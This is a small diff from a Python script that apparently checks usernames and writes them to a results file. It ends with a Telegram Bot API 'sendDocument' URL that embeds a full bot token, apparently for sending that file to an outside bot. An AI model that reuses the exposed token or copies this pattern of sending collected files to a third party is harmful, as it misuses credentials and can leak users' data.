@@ -94,7 +94,7 @@ with open('Results.txt', 'w') as f:
             time.sleep(2)
            
             
-        else: print(f'{Z}{req.json()}{Z}', username)
+        else: print(f'{Z}{req.json()['message']}{Z}', username)
         
 
 url = f'https://api.telegram.org/bot6243314109:AAEGKJIZkrjK8zB9X5wNeMrx4yUz3dPMhw8/sendDocument'
